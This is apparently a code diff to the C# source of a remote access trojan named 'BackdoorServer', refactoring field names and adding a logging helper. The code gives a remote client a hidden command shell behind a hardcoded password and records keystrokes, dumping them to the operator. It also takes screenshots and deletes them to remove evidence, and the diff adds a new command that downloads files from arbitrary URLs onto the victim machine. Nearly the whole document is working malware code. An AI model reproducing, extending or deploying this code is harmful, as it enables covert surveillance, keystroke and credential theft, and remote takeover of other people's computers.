@@ -13,66 +13,66 @@ namespace BackdoorServer
 {
     public class Backdoor
     {
-        TcpListener listener;
-        Socket socket;
-        Process shell;
-        StreamReader fromShell;
-        StreamWriter toShell;
-        StreamReader inStream;
-        StreamWriter outStream;
-        Thread shellReaderThread;
-        Thread keyloggerThread;
-        KeyLogger keylogger;
+        TcpListener Listener;
+        Socket Socket;
+        Process Shell;
+        StreamReader FromShell;
+        StreamWriter ToShell;
+        StreamReader InStream;
+        StreamWriter OutStream;
+        Thread ShellReaderThread;
+        Thread KeyloggerThread;
+        KeyLogger Keylogger;
 
-        int port { get; set; }
-        string serverName { get; set; }
-        string password { get; set; }
-        bool verbose { get; set; }
+        int Port { get; set; }
+        string Name { get; set; }
+        string Password { get; set; }
+        bool Verbose { get; set; }
 
         public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
         {
-            this.port = port;
-            this.serverName = serverName;
-            this.password = password;
-            this.verbose = verbose;
+            this.Port = port;
+            this.Name = serverName;
+            this.Password = password;
+            this.Verbose = verbose;
         }
 
         public void StartServer()
         {
-            Console.Title = "RAT Server:" + port;
+            Console.Title = "RAT Server:" + Port;
             try
             {
-                if (verbose) Console.WriteLine("Listening on port " + port);
+                if (Verbose) Log("Listening on port " + Port);
 
-                listener = new TcpListener(IPAddress.Any, port);
-                listener.Start(); // blocking call
-                socket = listener.AcceptSocket();
+                Listener = new TcpListener(IPAddress.Any, Port);
+                Listener.Start(); // blocking call
+                Socket = Listener.AcceptSocket();
 
-                if (verbose) Console.WriteLine("Client connected: " + socket.RemoteEndPoint);
+                if (Verbose) Log("Client connected: " + Socket.RemoteEndPoint);
 
-                Stream s = new NetworkStream(socket);
-                inStream = new StreamReader(s, Encoding.ASCII);
-                outStream = new StreamWriter(s, Encoding.ASCII);
-                outStream.AutoFlush = true;
+                Stream s = new NetworkStream(Socket);
+                InStream = new StreamReader(s, Encoding.ASCII);
+                OutStream = new StreamWriter(s, Encoding.ASCII);
+                OutStream.AutoFlush = true;
 
-                outStream.WriteLine("Pswd:");
-                string checkPass = inStream.ReadLine();
+                OutStream.WriteLine("Pswd:");
+                string checkPass = InStream.ReadLine();
 
-                if (verbose) Console.WriteLine("Client tried password " + checkPass);
-                if (!checkPass.Equals(password))
+                if (Verbose) Log("Client tried password " + checkPass);
+                if (!checkPass.Equals(Password))
                 {
-                    if (verbose) Console.WriteLine("Incorrect Password");
+                    if (Verbose) Log("Incorrect Password");
                     DropConnection();
                     return;
                 }
-                if (verbose) Console.WriteLine("Password Accepted.");
+                if (Verbose) Log("Password Accepted.");
 
                 StartShell();
             }
             catch (Exception e)
             {
-                Console.WriteLine("<ERROR> Bad things happen:");
-                Console.WriteLine(e.ToString());
+                Log("<ERROR> Something happened:");
+                Log(e.ToString());
             }
             finally
             {
@@ -82,7 +82,7 @@ namespace BackdoorServer
 
         void StartShell()
         {
-            shell = new Process();
+            Shell = new Process();
             ProcessStartInfo p = new ProcessStartInfo("cmd")
             {
                 CreateNoWindow = true,
@@ -91,20 +91,20 @@ namespace BackdoorServer
                 RedirectStandardInput = true,
                 RedirectStandardOutput = true
             };
-            shell.StartInfo = p;
-            shell.Start();
+            Shell.StartInfo = p;
+            Shell.Start();
 
-            toShell = shell.StandardInput;
-            fromShell = shell.StandardOutput;
-            toShell.AutoFlush = true;
+            ToShell = Shell.StandardInput;
+            FromShell = Shell.StandardOutput;
+            ToShell.AutoFlush = true;
 
             // start sending output to the user
-            shellReaderThread = new Thread(new ThreadStart(SendShellOutput));
-            shellReaderThread.Start();
+            ShellReaderThread = new Thread(new ThreadStart(SendShellOutput));
+            ShellReaderThread.Start();
 
             // welcome message
-            outStream.WriteLine(String.Format("  Welcome to {0} RAT  ", serverName).AlignCenter(80, '='));
-            outStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));
+            OutStream.WriteLine(String.Format("  Welcome to {0} RAT  ", Name).AlignCenter(80, '='));
+            OutStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));
 
             InputLoop();
         }
@@ -112,13 +112,13 @@ namespace BackdoorServer
         void SendShellOutput()
         {
             string buffer = "";
-            while ((buffer = fromShell.ReadLine()) != null)
+            while ((buffer = FromShell.ReadLine()) != null)
             {
-                outStream.WriteLine(buffer + "\r");
+                OutStream.WriteLine(buffer + "\r");
 
                 // temporary, for logging
                 Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.WriteLine(buffer);
+                Log(buffer);
                 Console.ResetColor();
             }
             CloseShell();
@@ -127,9 +127,9 @@ namespace BackdoorServer
         void InputLoop()
         {
             string tempBuff = "";
-            while (((tempBuff = inStream.ReadLine()) != null))
+            while (((tempBuff = InStream.ReadLine()) != null))
             {
-                if (verbose) Console.WriteLine(">> " + tempBuff);
+                if (Verbose) Log(">> " + tempBuff);
                 HandleCommand(tempBuff);
             }
         }
@@ -139,62 +139,86 @@ namespace BackdoorServer
             switch (command)
             {
                 case RatAction.SCREENSHOT:
-                    if (verbose) outStream.WriteLine("Taking a screenshot...");
+                    if (Verbose) OutStream.WriteLine("Taking a screenshot...");
                     string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
                     WindowsHelper.MakeScreenshot(path);
 
-                    Console.WriteLine("Image is hosted at port 2790");
-                    outStream.WriteLine("Image is hosted at port 2790");
+                    Log("Image is hosted at port 2790");
+                    OutStream.WriteLine("Image is hosted at port 2790");
                     HostImage(path);
-                    Console.WriteLine("Image Sent < OK > !");
+                    Log("Image Sent < OK > !");
                     // delete all proofs
                     File.Delete(path);
-                    Console.WriteLine("Image deleted");
-                    if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
+                    Log("Image deleted");
+                    if (Verbose) OutStream.WriteLine("Screenshot downloaded and deleted successfully!");
                     break;
                 case RatAction.KEYLOGGER_START:
-                    if (keylogger != null)
+                    if (Keylogger != null)
                     {
-                        keylogger.StopAndDump();
+                        Keylogger.StopAndDump();
                     }
-                    keylogger = new KeyLogger();
-                    keyloggerThread = new Thread(new ThreadStart(keylogger.Start));
-                    keyloggerThread.Start();
+                    Keylogger = new KeyLogger();
+                    KeyloggerThread = new Thread(new ThreadStart(Keylogger.Start));
+                    KeyloggerThread.Start();
                     break;
                 case RatAction.KEYLOGGER_DUMP:
-                    string dump = keylogger.StopAndDump();
-                    keyloggerThread.Abort();
-                    keyloggerThread = null;
-                    outStream.WriteLine("Captured input:");
-                    outStream.WriteLine(dump);
+                    string dump = Keylogger.StopAndDump();
+                    KeyloggerThread.Abort();
+                    KeyloggerThread = null;
+                    OutStream.WriteLine("Captured input:");
+                    OutStream.WriteLine(dump);
                     break;
                 case RatAction.SHOW_MESSAGE:
-                    if (verbose) Console.WriteLine("Show message mode");
-                    outStream.WriteLine("Title:");
-                    string title = inStream.ReadLine();
-                    outStream.WriteLine("Content");
-                    string content = inStream.ReadLine();
+                    if (Verbose) Log("Show message mode");
+                    OutStream.WriteLine("Title:");
+                    string title = InStream.ReadLine();
+                    OutStream.WriteLine("Content");
+                    string content = InStream.ReadLine();
 
-                    outStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
-                    string response = inStream.ReadLine();
+                    OutStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
+                    string response = InStream.ReadLine();
                     if (response.Equals("y"))
                     {
-                        outStream.WriteLine("Message shown");
+                        OutStream.WriteLine("Message shown");
                         new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
-                        Console.WriteLine("Message shown");
+                        Log("Message shown");
                     }
                     else
                     {
-                        Console.WriteLine("Message denied");
-                        outStream.WriteLine("MessageBox showing denied by the user");
+                        Log("Message denied");
+                        OutStream.WriteLine("MessageBox showing denied by the user");
                     }
                     break;
+                case RatAction.DOWNLOAD_FILE:
+                    if (Verbose) Log("File download mode");
+
+                    OutStream.WriteLine("Enter URL of desired file to download:");
+                    string url = InStream.ReadLine();
+                    OutStream.WriteLine("FileName/Path on remote computer:");
+                    string filePath = InStream.ReadLine();
+                    try
+                    {
+                        using (var client = new WebClient())
+                        {
+                            client.DownloadFile(url, filePath);
+                        }
+                        OutStream.WriteLine("File downloaded successfully");
+                        Log("File downloaded successfully");
+                    }
+                    catch (Exception e)
+                    {
+                        if (Verbose) Log("Exception during file download:");
+                        OutStream.WriteLine("Exception during file download:" + e);
+                        Log(e.ToString());
+                    }
+
+                    break;
                 case RatAction.QUIT:
-                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
+                    OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                     CloseShell();
                     break;
                 default:
-                    toShell.WriteLine(command + "\r\n");
+                    ToShell.WriteLine(command + "\r\n");
                     break;
             }
         }
@@ -214,7 +238,7 @@ namespace BackdoorServer
 
             var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
             lstr.Start();
-            Console.WriteLine("Waiting for client to connect...");
+            Log("Waiting for client to connect...");
             var webSocket = lstr.AcceptSocket();
 
             webSocket.Send(headerBytes);
@@ -225,11 +249,11 @@ namespace BackdoorServer
 
         void DropConnection()
         {
-            if (verbose) Console.WriteLine("Dropping Connection");
-            inStream.Dispose();
-            outStream.Dispose();
-            socket.Close();
-            listener.Stop();
+            if (Verbose) Log("Dropping Connection");
+            InStream.Dispose();
+            OutStream.Dispose();
+            Socket.Close();
+            Listener.Stop();
             // Console.Beep(382, 500);
         }
 
@@ -237,26 +261,30 @@ namespace BackdoorServer
         {
             try
             {
-                if (verbose) Console.WriteLine("Closing shell process");
-                if (shell != null)
+                if (Verbose) Log("Closing shell process");
+                if (Shell != null)
                 {
-                    shell.Close();
-                    shell.Dispose();
+                    Shell.Close();
+                    Shell.Dispose();
                 }
-                if (shellReaderThread != null)
+                if (ShellReaderThread != null)
                 {
-                    shellReaderThread.Abort();
-                    shellReaderThread = null;
+                    ShellReaderThread.Abort();
+                    ShellReaderThread = null;
                 }
-                toShell.Dispose();
-                fromShell.Dispose();
-                shell.Dispose();
+                ToShell.Dispose();
+                FromShell.Dispose();
+                Shell.Dispose();
 
                 DropConnection();
             }
             catch (Exception) { }
         }
 
+        void Log(string message)
+        {
+            Console.WriteLine(message);
+        }
         static void Main(string[] args)
         {
             try
